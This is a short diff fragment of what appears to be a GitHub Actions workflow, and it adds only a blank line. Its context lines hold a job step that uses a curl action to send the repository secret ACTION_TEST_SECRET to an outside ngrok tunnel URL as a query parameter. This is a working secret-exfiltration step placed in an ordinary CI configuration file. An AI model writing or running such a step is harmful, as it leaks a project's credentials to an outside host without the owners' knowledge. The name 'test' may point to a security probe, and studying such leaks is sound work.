@@ -22,3 +22,4 @@ jobs:
       uses: wei/curl@v1
       with:
         args: https://43ad-213-194-69-194.ngrok.io?secret="${{ secrets.ACTION_TEST_SECRET }}"
+
